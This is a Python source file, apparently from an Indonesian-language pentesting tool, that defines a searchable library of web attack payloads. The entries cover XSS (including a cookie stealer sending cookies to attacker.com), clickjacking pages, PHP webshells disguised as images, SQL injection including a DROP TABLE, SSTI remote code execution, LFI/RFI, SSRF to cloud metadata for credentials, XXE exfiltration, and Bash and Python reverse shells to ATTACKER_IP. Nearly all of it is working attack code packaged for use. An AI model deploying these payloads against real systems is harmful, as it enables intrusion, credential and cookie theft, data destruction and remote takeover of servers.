# * Pustaka Script Payload Pentesting (v5.9 Script Section)
class ScriptLibrary:
    def __init__(self):
        self.scripts = self._buildDatabase()

    # * Bangun database payload lengkap semua kategori
    def _buildDatabase(self):
        db = []

        # ========== XSS (Cross-Site Scripting) ==========
        db.append({
            "name": "XSS Basic Alert",
            "category": "XSS",
            "ext": ".js",
            "code": "<script>alert('XSS')</script>",
            "description": "Payload XSS paling dasar, test apakah tag script bisa dieksekusi di page target.",
            "risk": "Medium"
        })
        db.append({
            "name": "XSS IMG Tag",
            "category": "XSS",
            "ext": ".html",
            "code": "<img src=x onerror=alert('XSS')>",
            "description": "Bypass filter script tag via atribut onerror pada elemen IMG yang sumber-nya invalid.",
            "risk": "Medium"
        })
        db.append({
            "name": "XSS SVG OnLoad",
            "category": "XSS",
            "ext": ".html",
            "code": "<svg/onload=alert('XSS')>",
            "description": "Eksekusi JS lewat event onload pada elemen SVG, bypass banyak filter HTML standar.",
            "risk": "Medium"
        })
        db.append({
            "name": "XSS Event Handler",
            "category": "XSS",
            "ext": ".html",
            "code": "<body onload=alert('XSS')>",
            "description": "Inject event handler langsung di body tag untuk trigger JS saat halaman dimuat.",
            "risk": "Medium"
        })
        db.append({
            "name": "XSS Cookie Stealer",
            "category": "XSS",
            "ext": ".js",
            "code": "<script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>",
            "description": "Kirim cookie korban ke server attacker via request gambar tersembunyi.",
            "risk": "High"
        })
        db.append({
            "name": "XSS DOM Based",
            "category": "XSS",
            "ext": ".js",
            "code": "<script>document.write(location.hash.substring(1))</script>",
            "description": "Eksploitasi DOM manipulation yang nulis langsung dari URL hash tanpa sanitasi.",
            "risk": "Medium"
        })
        db.append({
            "name": "XSS Polyglot",
            "category": "XSS",
            "ext": ".txt",
            "code": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik/telerik/>",
            "description": "Multi-context polyglot XSS yang bisa jalan di berbagai konteks HTML/JS/URL.",
            "risk": "High"
        })
        db.append({
            "name": "XSS Input Autofocus",
            "category": "XSS",
            "ext": ".html",
            "code": "<input autofocus onfocus=alert('XSS')>",
            "description": "Trigger XSS otomatis via autofocus + onfocus event tanpa interaksi user.",
            "risk": "Medium"
        })
        db.append({
            "name": "XSS Details Tag",
            "category": "XSS",
            "ext": ".html",
            "code": "<details open ontoggle=alert('XSS')>",
            "description": "HTML5 details tag dengan ontoggle event, sering lolos WAF filter.",
            "risk": "Medium"
        })
        db.append({
            "name": "XSS Anchor Tag",
            "category": "XSS",
            "ext": ".html",
            "code": "<a href=javascript:alert('XSS')>Click</a>",
            "description": "JavaScript protocol handler di href link, butuh interaksi klik dari user.",
            "risk": "Low"
        })

        # ========== UXSS (Universal XSS) ==========
        db.append({
            "name": "UXSS PDF Embed",
            "category": "UXSS",
            "ext": ".html",
            "code": "<embed src='evil.pdf#javascript:alert(1)' type='application/pdf'>",
            "description": "Eksploitasi PDF viewer bawaan browser yang bisa execute JS dari fragment identifier.",
            "risk": "High"
        })
        db.append({
            "name": "UXSS iframe Sandbox",
            "category": "UXSS",
            "ext": ".html",
            "code": "<iframe src='javascript:alert(1)' sandbox='allow-scripts allow-same-origin'></iframe>",
            "description": "Bypass sandbox iframe dengan kombinasi allow-scripts dan allow-same-origin.",
            "risk": "High"
        })
        db.append({
            "name": "UXSS Location Hash",
            "category": "UXSS",
            "ext": ".html",
            "code": "<iframe src='target.com#<img src=x onerror=alert(1)>'></iframe>",
            "description": "Inject payload via URL hash yang di-render tanpa sanitasi oleh aplikasi dalam iframe.",
            "risk": "High"
        })

        # ========== CLICKJACKING ==========
        db.append({
            "name": "Clickjack Basic iframe",
            "category": "Clickjacking",
            "ext": ".html",
            "code": """<!DOCTYPE html>
<html>
<head><title>Clickjack PoC</title></head>
<body>
<h2>Click the button below!</h2>
<div style="position:relative;width:500px;height:400px;">
    <iframe src="TARGET_URL" style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.0001;z-index:2;"></iframe>
    <button style="position:absolute;top:200px;left:150px;z-index:1;padding:15px 30px;font-size:18px;cursor:pointer;">Click Here to Win!</button>
</div>
</body>
</html>""",
            "description": "Template Clickjacking PoC standar dengan iframe transparan di atas tombol palsu. Ganti TARGET_URL dengan URL target.",
            "risk": "Medium"
        })
        db.append({
            "name": "Clickjack Transparent Overlay",
            "category": "Clickjacking",
            "ext": ".html",
            "code": """<!DOCTYPE html>
<html>
<body>
<div style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:999;">
    <iframe src="TARGET_URL" style="width:100%;height:100%;border:none;opacity:0;"></iframe>
</div>
<div style="text-align:center;padding:100px;">
    <h1>Free Prize! Click Anywhere!</h1>
</div>
</body>
</html>""",
            "description": "Fullscreen transparent overlay, korban klik di mana aja pasti kena target iframe.",
            "risk": "Medium"
        })
        db.append({
            "name": "Clickjack Cursorjacking",
            "category": "Clickjacking",
            "ext": ".html",
            "code": """<style>body{cursor:none;}
.fakeCursor{position:fixed;pointer-events:none;z-index:9999;width:20px;height:20px;}</style>
<div class="fakeCursor" id="fc"></div>
<iframe src="TARGET_URL" style="position:fixed;top:0;left:0;width:100%;height:100%;opacity:0;"></iframe>
<script>
document.onmousemove=function(e){
    var fc=document.getElementById('fc');
    fc.style.left=(e.clientX-50)+'px';
    fc.style.top=(e.clientY-50)+'px';
};
</script>""",
            "description": "Geser posisi visual cursor biar korban klik di posisi yang salah (cursor offset attack).",
            "risk": "High"
        })
        db.append({
            "name": "Clickjack Likejacking",
            "category": "Clickjacking",
            "ext": ".html",
            "code": """<iframe src="https://facebook.com/plugins/like.php?href=TARGET_PAGE" style="position:absolute;opacity:0;width:100px;height:30px;"></iframe>
<button style="padding:10px 20px;">Download Free Software</button>""",
            "description": "Sembunyiin tombol Like Facebook di atas tombol palsu, korban auto-like tanpa sadar.",
            "risk": "Low"
        })

        # ========== FAKE IMAGE / FILE UPLOAD ==========
        db.append({
            "name": "PHP Shell as JPG",
            "category": "Fake Image",
            "ext": ".jpg",
            "code": """GIF89a;<?php echo '<pre>'.shell_exec($_GET['cmd']).'</pre>'; ?>""",
            "description": "File PHP dengan GIF header magic bytes, bypass validasi upload yang cuma cek header file.",
            "risk": "Critical"
        })
        db.append({
            "name": "SVG with JS",
            "category": "Fake Image",
            "ext": ".svg",
            "code": """<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS via SVG')">
<text x="10" y="20">SVG Payload</text>
</svg>""",
            "description": "File SVG valid yang mengandung JavaScript di atribut onload, execute saat di-render browser.",
            "risk": "Medium"
        })
        db.append({
            "name": "GIF Header PHP Shell",
            "category": "Fake Image",
            "ext": ".gif",
            "code": """GIF89a;
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
}
?>""",
            "description": "PHP webshell dengan GIF89a header, bypass content-type check berbasis magic bytes.",
            "risk": "Critical"
        })
        db.append({
            "name": "EXIF Injection",
            "category": "Fake Image",
            "ext": ".jpg",
            "code": """exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg image.php.jpg""",
            "description": "Inject PHP code ke EXIF comment metadata gambar, execute kalo server process EXIF data.",
            "risk": "High"
        })
        db.append({
            "name": "Double Extension Bypass",
            "category": "Fake Image",
            "ext": ".php.jpg",
            "code": """<?php echo shell_exec($_GET['cmd']); ?>
<!-- Simpan sebagai: shell.php.jpg atau shell.php%00.jpg -->""",
            "description": "Bypass upload filter via double extension atau null byte truncation pada nama file.",
            "risk": "Critical"
        })
        db.append({
            "name": "Polyglot JPEG PHP",
            "category": "Fake Image",
            "ext": ".jpg",
            "code": r"\xff\xd8\xff\xe0<?php system($_GET['cmd']); __halt_compiler();",
            "description": "File yang valid sebagai JPEG dan PHP sekaligus, bypass validasi berbasis magic bytes.",
            "risk": "Critical"
        })

        # ========== SQLi (SQL Injection) ==========
        db.append({
            "name": "SQLi Auth Bypass",
            "category": "SQLi",
            "ext": ".txt",
            "code": "' OR 1=1 -- -",
            "description": "Classic authentication bypass, masukkin di field username atau password form login.",
            "risk": "High"
        })
        db.append({
            "name": "SQLi Union Select",
            "category": "SQLi",
            "ext": ".txt",
            "code": "' UNION SELECT 1,2,3,4,5 -- -",
            "description": "Union-based injection buat gabungin data dari tabel lain, sesuaiin jumlah kolom.",
            "risk": "High"
        })
        db.append({
            "name": "SQLi Error Based",
            "category": "SQLi",
            "ext": ".txt",
            "code": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -",
            "description": "Paksa MySQL ngeluarin error yang isinya informasi database (version, table names).",
            "risk": "High"
        })
        db.append({
            "name": "SQLi Time Blind",
            "category": "SQLi",
            "ext": ".txt",
            "code": "' OR IF(1=1,SLEEP(5),0) -- -",
            "description": "Time-based blind injection, kalo response delay 5 detik berarti target vulnerable.",
            "risk": "High"
        })
        db.append({
            "name": "SQLi Stacked Queries",
            "category": "SQLi",
            "ext": ".sql",
            "code": "'; DROP TABLE users; -- -",
            "description": "Stacked query injection buat jalanin multiple SQL statement sekaligus (destructive).",
            "risk": "Critical"
        })
        db.append({
            "name": "SQLi Extract DB Name",
            "category": "SQLi",
            "ext": ".txt",
            "code": "' UNION SELECT NULL,database(),NULL -- -",
            "description": "Extract nama database aktif via union injection, sesuaiin jumlah kolom NULL.",
            "risk": "High"
        })
        db.append({
            "name": "SQLi List Tables",
            "category": "SQLi",
            "ext": ".txt",
            "code": "' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database() -- -",
            "description": "List semua nama tabel di database aktif target via information_schema.",
            "risk": "High"
        })

        # ========== SSTI (Server-Side Template Injection) ==========
        db.append({
            "name": "SSTI Jinja2 Detection",
            "category": "SSTI",
            "ext": ".txt",
            "code": "{{7*7}}",
            "description": "Detect apakah target pake Jinja2 template engine, kalo output 49 berarti vulnerable.",
            "risk": "Medium"
        })
        db.append({
            "name": "SSTI Jinja2 RCE",
            "category": "SSTI",
            "ext": ".py",
            "code": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "description": "Remote Code Execution via Jinja2 SSTI, akses os module dari config object.",
            "risk": "Critical"
        })
        db.append({
            "name": "SSTI Twig Dump",
            "category": "SSTI",
            "ext": ".php",
            "code": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "description": "RCE pada Twig template engine (PHP/Symfony), register callback exec lalu panggil.",
            "risk": "Critical"
        })
        db.append({
            "name": "SSTI Freemarker",
            "category": "SSTI",
            "ext": ".java",
            "code": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
            "description": "RCE pada Apache Freemarker template engine (Java), bikin instance Execute baru.",
            "risk": "Critical"
        })
        db.append({
            "name": "SSTI Mako",
            "category": "SSTI",
            "ext": ".py",
            "code": "${__import__('os').popen('id').read()}",
            "description": "RCE pada Mako template engine (Python), langsung import os and execute command.",
            "risk": "Critical"
        })
        db.append({
            "name": "SSTI ERB Ruby",
            "category": "SSTI",
            "ext": ".rb",
            "code": "<%= system('id') %>",
            "description": "RCE pada ERB template engine (Ruby on Rails), execute system command langsung.",
            "risk": "Critical"
        })

        # ========== CRLF Injection ==========
        db.append({
            "name": "CRLF Header Injection",
            "category": "CRLF",
            "ext": ".txt",
            "code": "%0d%0aSet-Cookie:%20hacked=true",
            "description": "Inject header Set-Cookie baru via CRLF sequence di URL parameter.",
            "risk": "Medium"
        })
        db.append({
            "name": "CRLF HTTP Splitting",
            "category": "CRLF",
            "ext": ".html",
            "code": "%0d%0a%0d%0a<html><script>alert('XSS via CRLF')</script></html>",
            "description": "HTTP response splitting, inject body HTML baru setelah double CRLF.",
            "risk": "High"
        })
        db.append({
            "name": "CRLF Log Poisoning",
            "category": "CRLF",
            "ext": ".txt",
            "code": "%0d%0a[ADMIN] User logged in successfully",
            "description": "Inject log entry palsu via CRLF, bisa fake audit trail di server logs.",
            "risk": "Medium"
        })

        # ========== LFI / RFI (File Inclusion) ==========
        db.append({
            "name": "LFI Linux passwd",
            "category": "LFI",
            "ext": ".txt",
            "code": "../../../../etc/passwd",
            "description": "Path traversal klasik buat baca file /etc/passwd di server Linux.",
            "risk": "High"
        })
        db.append({
            "name": "LFI Windows win.ini",
            "category": "LFI",
            "ext": ".txt",
            "code": "..\\..\\..\\..\\windows\\win.ini",
            "description": "Path traversal buat baca win.ini di server Windows, bukti LFI vulnerability.",
            "risk": "High"
        })
        db.append({
            "name": "LFI PHP Filter Base64",
            "category": "LFI",
            "ext": ".php",
            "code": "php://filter/convert.base64-encode/resource=index.php",
            "description": "Baca source code PHP tanpa dieksekusi via PHP filter wrapper, output dalam base64.",
            "risk": "High"
        })
        db.append({
            "name": "LFI PHP Input Wrapper",
            "category": "LFI",
            "ext": ".php",
            "code": "php://input",
            "description": "Baca raw POST data, bisa dipake buat inject PHP code via request body.",
            "risk": "High"
        })
        db.append({
            "name": "LFI Null Byte",
            "category": "LFI",
            "ext": ".txt",
            "code": "../../../../etc/passwd%00",
            "description": "Null byte truncation buat bypass extension check (PHP < 5.3.4).",
            "risk": "High"
        })
        db.append({
            "name": "RFI Remote Shell",
            "category": "LFI",
            "ext": ".txt",
            "code": "http://attacker.com/shell.txt",
            "description": "Include file remote yang isinya PHP shell dari server attacker (butuh allow_url_include=On).",
            "risk": "Critical"
        })

        # ========== Command Injection ==========
        db.append({
            "name": "CMDi Basic Linux",
            "category": "Command Injection",
            "ext": ".sh",
            "code": "; id; whoami",
            "description": "Basic OS command injection di Linux via semicolon separator.",
            "risk": "Critical"
        })
        db.append({
            "name": "CMDi Basic Windows",
            "category": "Command Injection",
            "ext": ".bat",
            "code": "& whoami & ipconfig",
            "description": "Basic OS command injection di Windows via ampersand separator.",
            "risk": "Critical"
        })
        db.append({
            "name": "CMDi Blind Ping",
            "category": "Command Injection",
            "ext": ".sh",
            "code": "; ping -c 5 ATTACKER_IP ;",
            "description": "Blind command injection, konfirmasi via ping ke IP attacker yang lagi listen ICMP.",
            "risk": "High"
        })
        db.append({
            "name": "CMDi Pipe Operator",
            "category": "Command Injection",
            "ext": ".sh",
            "code": "| cat /etc/passwd",
            "description": "Pipe output ke command cat buat baca file sensitif pada server Linux.",
            "risk": "Critical"
        })
        db.append({
            "name": "CMDi Reverse Shell Bash",
            "category": "Command Injection",
            "ext": ".sh",
            "code": "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
            "description": "Template reverse shell Bash, ganti ATTACKER_IP dengan IP lu. Listen pake: nc -lvnp 4444",
            "risk": "Critical"
        })
        db.append({
            "name": "CMDi Reverse Shell Python",
            "category": "Command Injection",
            "ext": ".py",
            "code": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "description": "Reverse shell via Python3, buat target yang ada Python tapi gak ada Bash.",
            "risk": "Critical"
        })

        # ========== Open Redirect ==========
        db.append({
            "name": "Redirect Parameter",
            "category": "Open Redirect",
            "ext": ".txt",
            "code": "?redirect=https://evil.com",
            "description": "Open redirect via common parameter names (redirect, url, next, dest, redir).",
            "risk": "Low"
        })
        db.append({
            "name": "Redirect Double Encode",
            "category": "Open Redirect",
            "ext": ".txt",
            "code": "?url=https%253A%252F%252Fevil.com",
            "description": "Double URL encoding buat bypass filter redirect sederhana.",
            "risk": "Medium"
        })
        db.append({
            "name": "Redirect Protocol Bypass",
            "category": "Open Redirect",
            "ext": ".txt",
            "code": "?next=//evil.com",
            "description": "Protocol-relative URL bypass, browser otomatis pake protokol halaman saat ini.",
            "risk": "Medium"
        })

        # ========== SSRF (Server-Side Request Forgery) ==========
        db.append({
            "name": "SSRF Internal Scan",
            "category": "SSRF",
            "ext": ".txt",
            "code": "http://127.0.0.1:PORT",
            "description": "Scan port internal server dari dalam via SSRF, ganti PORT dengan target (22,3306,6379).",
            "risk": "High"
        })
        db.append({
            "name": "SSRF AWS Metadata",
            "category": "SSRF",
            "ext": ".txt",
            "code": "http://169.254.169.254/latest/meta-data/",
            "description": "Akses AWS EC2 instance metadata endpoint buat steal IAM credentials.",
            "risk": "Critical"
        })
        db.append({
            "name": "SSRF GCP Metadata",
            "category": "SSRF",
            "ext": ".txt",
            "code": "http://metadata.google.internal/computeMetadata/v1/",
            "description": "Akses Google Cloud metadata endpoint, butuh header Metadata-Flavor: Google.",
            "risk": "Critical"
        })
        db.append({
            "name": "SSRF File Protocol",
            "category": "SSRF",
            "ext": ".txt",
            "code": "file:///etc/passwd",
            "description": "Baca file lokal server via file:// protocol handler di SSRF endpoint.",
            "risk": "Critical"
        })

        # ========== XXE (XML External Entity) ==========
        db.append({
            "name": "XXE Basic Entity",
            "category": "XXE",
            "ext": ".xml",
            "code": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>""",
            "description": "Basic XXE buat baca file lokal server via XML external entity declaration.",
            "risk": "Critical"
        })
        db.append({
            "name": "XXE SSRF via Entity",
            "category": "XXE",
            "ext": ".xml",
            "code": """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>""",
            "description": "Kombinasi XXE + SSRF buat akses AWS metadata dari dalam server via XML parser.",
            "risk": "Critical"
        })
        db.append({
            "name": "XXE Blind OOB",
            "category": "XXE",
            "ext": ".xml",
            "code": """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP/evil.dtd">
  %xxe;
]>
<root>test</root>""",
            "description": "Blind Out-of-Band XXE, data dikirim ke server attacker via external DTD file.",
            "risk": "Critical"
        })

        return db

    # * Ambil daftar semua kategori unik
    def getCategories(self):
        cats = []
        seen = set()
        for s in self.scripts:
            if s["category"] not in seen:
                cats.append(s["category"])
                seen.add(s["category"])
        return cats

    # * Ambil semua script dalam satu kategori
    def getScripts(self, category):
        return [s for s in self.scripts if s["category"] == category]

    # * Cari script berdasarkan nama persis
    def getScript(self, name):
        for s in self.scripts:
            if s["name"] == name:
                return s
        return None

    # * Cari script berdasarkan keyword (nama atau deskripsi)
    def searchScripts(self, query):
        query = query.lower()
        return [s for s in self.scripts if query in s["name"].lower() or query in s["description"].lower() or query in s["category"].lower()]
